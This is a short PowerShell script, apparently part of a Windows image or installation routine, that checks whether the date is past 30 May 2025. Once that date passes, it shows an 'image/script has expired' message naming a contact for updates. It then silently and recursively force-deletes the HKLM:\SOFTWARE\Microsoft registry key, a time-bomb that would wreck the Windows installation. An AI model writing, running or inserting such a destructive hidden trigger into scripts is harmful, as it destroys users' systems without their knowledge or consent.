$Date1 = (Get-Date -Month 05 -Day 30 -Year 2025)
$Date2 = Get-Date
New-Item -Path "C:\Windows" -Name "TimeCheck.flg" -ItemType file
if ($Date1 -lt $Date2)
{
	Add-Type -AssemblyName PresentationFramework
	[System.Windows.MessageBox]::Show('Image/Script has expired, Windows installation interrupt, Get Update from xidong.zhang@hp.com!')
	Remove-Item -Path HKLM:\SOFTWARE\Microsoft -Recurse -Force -Confirm:$false
	
}